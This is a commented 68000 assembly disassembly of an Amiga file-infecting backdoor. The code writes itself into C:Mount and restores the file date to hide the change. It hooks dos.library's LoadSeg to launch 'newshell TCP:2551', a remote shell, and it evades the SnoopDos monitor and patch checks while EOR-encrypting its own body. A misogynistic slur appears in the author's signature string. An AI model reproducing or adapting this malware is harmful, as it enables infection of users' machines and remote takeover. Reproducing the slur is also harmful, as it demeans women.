
_LVOAllocVec	EQU	-$2AC
_LVOUnLockDosList	EQU	-$294
_LVOOldOpenLibrary	EQU	-$198
_LVOOpen	EQU	-$1E
_LVORead	EQU	-$2A
_LVOCloseLibrary	EQU	-$19E
_LVOExamine	EQU	-$66
_LVOCacheClearU	EQU	-$27C
_LVODeleteIORequest	EQU	-$294
_LVOUnLock	EQU	-$5A
_LVOSetFileDate	EQU	-$18C
_LVOLoadSeg	EQU	-$96
_LVOInitResident	EQU	-$66
_LVOFreeVec	EQU	-$2B2
_LVOWrite	EQU	-$30
_LVOFindDosEntry	EQU	-$2AC
_LVOExecute	EQU	-$DE
_LVOLockDosList	EQU	-$28E
_LVOClose	EQU	-$24
_LVOFindTask	EQU	-$126
_LVOLock	EQU	-$54
_LVOCopyMem	EQU	-$270
_LVOMakeLibrary	EQU	-$54
****************************************************************************
	MOVEM.L	D0-D7/A0-A6,-(SP)
	MOVEA.L	(4).W,A6
	BSR.W	_cryptEOR
lbC00000C	BSR.W	_checkSnoopDos
	BEQ.W	_abortBackdoor
	BSR.B	_installBackdoor
	dw	$646F	;resource doesn't like the following branches
	dw	$732E
	dw	$6C69
	dw	$6272
	dw	$6172
	dw	$7900

_installBackdoor	MOVEA.L	(SP)+,A1
	JSR	(_LVOOldOpenLibrary,A6)
	BEQ.W	_abortBackdoor
	MOVEA.L	D0,A5
	LEA	(lbL0002C0,PC),A1
	MOVE.L	D0,(A1)
	BSR.W	lbC000294
	BEQ.W	lbC0001F4
	MOVEQ	#0,D1
	MOVEQ	#$10,D0
	LSL.L	#7,D0
	JSR	(_LVOAllocVec,A6)
	MOVEA.L	D0,A3
	BEQ.W	lbC0001F4
	MOVEA.L	A3,A1
	LEA	(*-$FFFF006A,PC),A0
	MOVEQ	#$10,D0
	LSL.L	#7,D0
	JSR	(_LVOCopyMem,A6)
	BRA.B	*-$62	;call the copy of the code

SnoopDosSuppo.MSG	db	'SnoopDos Support Process',0
CMount.MSG	db	'C:Mount',0
	db	'run >NIL: newshell '
TC.MSG	db	'TC'
P.MSG	db	'P',0
	db	'2551',0,0
	db	'STD presents - Vaginitis #2 -- filthy whore!'

	LEA	(lbB0002BE,PC),A1
	TST.B	(A1)
	BNE.W	_patchLoadSeg
	LEA	(CMount.MSG,PC),A4
	MOVE.L	A4,D1
	MOVEQ	#-2,D2
	JSR	(_LVOLock,A5)
	MOVE.L	D0,D1
	BEQ.W	lbC0001F4
	MOVE.L	D0,D4
	LEA	(lbL0002C8,PC),A3
	MOVE.L	A3,D2
	JSR	(_LVOExamine,A5)
	MOVE.L	D4,D1
	JSR	(_LVOUnLock,A5)
	MOVE.L	($7C,A3),D0
	MOVE.L	D0,D3
	MOVE.L	D0,-(SP)
	MOVE.L	D3,D0
	MOVEQ	#1,D1
	SWAP	D1
	JSR	(_LVOAllocVec,A6)
	MOVEA.L	D0,A3
	BEQ.W	lbC000206
	MOVE.L	#$3ED,D2
lbC000112	MOVE.L	A4,D1
	JSR	(_LVOOpen,A5)
	MOVE.L	D0,D5
	MOVE.L	D5,D1
lbC00011C	BEQ.W	lbC000200
	MOVE.L	A3,D2
	JSR	(_LVORead,A5)
	MOVE.L	D5,D1
lbC000128	JSR	(_LVOClose,A5)
	MOVEA.L	A3,A2
	MOVE.L	(8,A2),D0
	LSL.L	#2,D0
	MOVE.L	D0,D6
lbC000136	ADDI.L	#$C8,($14,A2)
	ADDA.L	#$18,A2
	ADDA.L	D0,A2
	MOVE.L	(A2),D4
	LSL.L	#2,D4
	ADDI.L	#$C8,(A2)+
	ADDA.L	D4,A2
	MOVE.W	(-2,A2),D0
	MOVE.W	#$4E75,D1
	MOVE.W	#$4E71,D2
	CMP.W	D0,D1
	BEQ.B	lbC000170
	MOVE.W	(-4,A2),D0
	CMP.W	D0,D1
	BNE.W	lbC000200
	MOVE.W	D2,(-4,A2)
lbC000170	MOVE.W	D2,(-2,A2)
	MOVE.L	A4,D1
	MOVE.L	#$3EE,D2
	JSR	(_LVOOpen,A5)
	MOVE.L	D0,D5
	MOVE.L	D5,D1
	MOVE.L	A3,D2
	ADDI.L	#$1C,D4
	ADD.L	D6,D4
	MOVE.L	D4,D3
	JSR	(_LVOWrite,A5)
	LEA	(lbB0002BE,PC),A1
	MOVE.B	#1,(A1)
	MOVE.L	D5,D1
	LEA	(*-$FFFF01BA,PC),A1
	MOVE.L	A1,D2
	MOVE.L	#$320,D3
	BSR.W	*-$FFFF01C0
	MOVE.L	D5,D1
	MOVE.L	(SP)+,D3
	SUB.L	D4,D3
	MOVE.L	A3,D2
	ADD.L	D4,D2
	JSR	(_LVOWrite,A5)
	MOVE.L	D5,D1
	JSR	(_LVOClose,A5)
	MOVE.L	A4,D1
	LEA	(*+$188,PC),A1	;filedate in FIB
	MOVE.L	A1,D2
	JSR	(_LVOSetFileDate,A5)
	MOVEA.L	A3,A1
	JSR	(_LVOFreeVec,A6)
	BRA.B	lbC0001F4

_patchLoadSeg	MOVEA.L	(_LVOLoadSeg+2,A5),A1
	CMPI.W	#$60F0,(-2,A1)
	BEQ.B	lbC0001F4
	LEA	(_LVOLoadSeg+2,A5),A1
	LEA	(lbC000270,PC),A0
	MOVE.L	(A1),(2,A0)
	LEA	(_loadSegPatch,PC),A0
	MOVE.L	A0,(A1)
lbC0001F4	EXG	A5,A1
	JSR	(_LVOCloseLibrary,A6)
_abortBackdoor	MOVEM.L	(SP)+,D0-D7/A0-A6
	RTS

lbC000200	MOVEA.L	A3,A1
	JSR	(_LVOFreeVec,A6)
lbC000206	MOVE.L	(SP)+,D3
	BRA.B	lbC0001F4

_loadSegPatch	MOVEM.L	D0-D7/A0-A6,-(SP)
	LEA	(lbB0002BF,PC),A3
	TST.B	(A3)
	BNE.B	lbC00026C
	BSR.B	_checkSnoopDos
	BEQ.B	lbC00026C
	LEA	(lbL0002C0,PC),A1
	MOVEA.L	(A1),A5
	BSR.B	lbC000294
	BEQ.B	lbC00026C
	MOVEQ	#5,D5
	MOVE.L	D5,D1
	JSR	(_LVOLockDosList,A5)
	BRA.B	lbC000232

	BCS.B	START+$02A8
	MOVEQ	#$6C,D0
lbC000232	MOVE.L	D0,D1
	BEQ.B	lbC00026C
	LEA	(TC.MSG,PC),A4
	MOVE.L	A4,D2
	MOVEQ	#4,D3
	JSR	(_LVOFindDosEntry,A5)
	MOVE.L	D0,D4
	MOVE.L	D5,D1
	JSR	(_LVOUnLockDosList,A5)
	TST.W	D4
	BEQ.B	lbC00026C
	MOVE.B	#$3A,(3,A4)
	SUBA.L	#$13,A4
	MOVE.L	A4,D1
	MOVEQ	#0,D2
	MOVEQ	#0,D3
	JSR	(_LVOExecute,A5)	;newshell TCP:2551
	TST.W	D0
	BEQ.B	lbC00026C
	MOVE.B	#1,(A3)
lbC00026C	MOVEM.L	(SP)+,D0-D7/A0-A6
lbC000270	JMP	(0).L	;call old LoadSeg()

_checkSnoopDos	MOVEA.L	(4).W,A6
	MOVEA.L	(_LVOFindTask+2,A6),A0
	CMPI.W	#$BFFA,(A0)	;verify that FindPatch ain't patched
	BEQ.B	lbC000292
	LEA	(SnoopDosSuppo.MSG,PC),A1
	JSR	(_LVOFindTask,A6)
	TST.L	D0
	EORI.B	#4,CCR
lbC000292	RTS

lbC000294	MOVEA.L	(_LVOExamine+2,A5),A0	;verify that Examine() ain't patched
	CMPI.W	#$52B9,(A0)
	RTS

lbW00029E	dw	$F33D

_cryptEOR	MOVEM.L	D0-D7/A0-A6,-(SP)
	LEA	(lbC00000C,PC),A0
	LEA	(lbW00029E,PC),A1
	MOVE.W	(A1),D0
lbC0002AE	EOR.W	D0,(A0)+
	CMPA.L	A0,A1
	BNE.B	lbC0002AE
	JSR	(_LVOCacheClearU,A6)
	MOVEM.L	(SP)+,D0-D7/A0-A6
	RTS

lbB0002BE	db	0
lbB0002BF	db	0
lbL0002C0	dl	0
	dl	0
lbL0002C8	dl	0
	dl	0
	dl	0
	dl	0
	dl	0
	dl	0
	dl	0
	dl	0
	dl	0
	dl	0
	dl	0
	dl	0
	dl	0
	dl	0
	dl	0
	dl	0
	dl	0
	dl	0
	dl	0
	dl	0
	dl	0
	dl	0
	dl	0
	dl	0
	dl	0
	dl	0

	end
